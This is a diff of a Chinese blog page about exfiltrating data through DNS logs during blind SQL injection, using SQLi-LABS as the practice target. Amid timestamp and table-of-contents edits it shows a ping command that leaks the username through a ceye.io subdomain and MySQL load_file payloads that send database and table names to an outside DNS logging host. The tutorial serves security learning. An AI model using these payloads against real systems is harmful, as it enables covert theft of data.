@@ -121,7 +121,7 @@
 <meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5035860-91b10fdf200aa38d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
 <meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5035860-f9a8f9b8e4cdf05d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
 <meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5035860-7d2c6918badf1e80.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
-<meta property="og:updated_time" content="2018-12-03T13:38:14.893Z">
+<meta property="og:updated_time" content="2018-12-04T00:40:34.944Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Dnslog在SQL注入中的利用">
 <meta name="twitter:description" content="参考文献：www.anquanke.com/post/id/98096                https://bbs.pediy.com/thread-223881.htm DNSlog在Web攻击的利用在某些无法直接利用漏洞获得回显的情况下，但是目标可以发起DNS请求，这个时候就可以通过DNSlog把想获得的数据外带出来。 常用情况 SQL注入中的盲注无回显的命令执行无回显的SSRF">
@@ -388,7 +388,7 @@
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Modified: 2018-12-03 21:38:14" itemprop="dateModified" datetime="2018-12-03T21:38:14+08:00">2018-12-03</time>
+                <time title="Modified: 2018-12-04 08:40:34" itemprop="dateModified" datetime="2018-12-04T08:40:34+08:00">2018-12-04</time>
               
             
           </span>
@@ -428,8 +428,9 @@
 </blockquote>
 <h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p><img src="https://upload-images.jianshu.io/upload_images/5035860-bfbd8a53f7e11710.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br>攻击者提交注入语句，让数据库把需要查询的值和域名拼接起来，然后发生DNS查询，只要能获得DNS的日志，就得到了想要的值。</p>
 <ul>
-<li>推荐一个免费的dnslog平台：<a href="https://link.jianshu.com/?t=http://ceye.io" target="_blank" rel="noopener">http://ceye.io</a><br>####1.命令执行<br><code>ping %USERNAME%.xxxxxx.ceye.io</code><br><img src="https://upload-images.jianshu.io/upload_images/5035860-98cd223b915eba9f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></li>
+<li>推荐一个免费的dnslog平台：<a href="https://link.jianshu.com/?t=http://ceye.io" target="_blank" rel="noopener">http://ceye.io</a></li>
 </ul>
+<h4 id="1-命令执行"><a href="#1-命令执行" class="headerlink" title="1.命令执行"></a>1.命令执行</h4><p><code>ping %USERNAME%.xxxxxx.ceye.io</code><br><img src="https://upload-images.jianshu.io/upload_images/5035860-98cd223b915eba9f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
 <h4 id="2-MySQL"><a href="#2-MySQL" class="headerlink" title="2.MySQL"></a>2.MySQL</h4><p><strong>load_file</strong><br>在MySQL中有个<code>load_file()</code>函数可以用来读取本地的文件,<code>load_file()</code>函数还可以用来发送dns解析请求<br><em>以SQLi-LABS 第五关为例：</em><br><strong>payload：</strong><br><code>?id=1&#39; and if((select load_file(concat(&#39;\\\\&#39;,(select database()),&#39;.xxxxxx.ceye.io\\abc&#39;))),1,1)--+</code><br><img src="https://upload-images.jianshu.io/upload_images/5035860-91b10fdf200aa38d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br><strong>payload：</strong><br><code>?id=1&#39; and if((select load_file(concat(&#39;\\\\&#39;,(select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),&#39;.xxxxxx.ceye.io\\abc&#39;))),1,1)--+</code><br> <img src="https://upload-images.jianshu.io/upload_images/5035860-f9a8f9b8e4cdf05d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
 <p>concat()函数拼接了4个<code>\</code>了，因为转义的原因，<code>\\\\</code>就变成了<code>\\</code>，目的就是利用<code>UNC路径</code>。</p>
 <blockquote>
@@ -570,7 +571,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">59</span>
+                    <span class="site-state-item-count">61</span>
                     <span class="site-state-item-name">posts</span>
                   </a>
                 </div>
@@ -634,7 +635,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#DNSlog在Web攻击的利用"><span class="nav-number">1.</span> <span class="nav-text">DNSlog在Web攻击的利用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#常用情况"><span class="nav-number">2.</span> <span class="nav-text">常用情况</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#原理"><span class="nav-number">3.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-MySQL"><span class="nav-number">4.</span> <span class="nav-text">2.MySQL</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-msSQL"><span class="nav-number">5.</span> <span class="nav-text">3.msSQL</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-postgreSQL"><span class="nav-number">6.</span> <span class="nav-text">4.postgreSQL</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-SQL-Server"><span class="nav-number">7.</span> <span class="nav-text">5.SQL Server</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#6-Oracle"><span class="nav-number">8.</span> <span class="nav-text">6.Oracle</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#DNSlog在Web攻击的利用"><span class="nav-number">1.</span> <span class="nav-text">DNSlog在Web攻击的利用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#常用情况"><span class="nav-number">2.</span> <span class="nav-text">常用情况</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#原理"><span class="nav-number">3.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-命令执行"><span class="nav-number">4.</span> <span class="nav-text">1.命令执行</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-MySQL"><span class="nav-number">5.</span> <span class="nav-text">2.MySQL</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-msSQL"><span class="nav-number">6.</span> <span class="nav-text">3.msSQL</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-postgreSQL"><span class="nav-number">7.</span> <span class="nav-text">4.postgreSQL</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-SQL-Server"><span class="nav-number">8.</span> <span class="nav-text">5.SQL Server</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#6-Oracle"><span class="nav-number">9.</span> <span class="nav-text">6.Oracle</span></a></li></ol></div>
             
 
           </div>
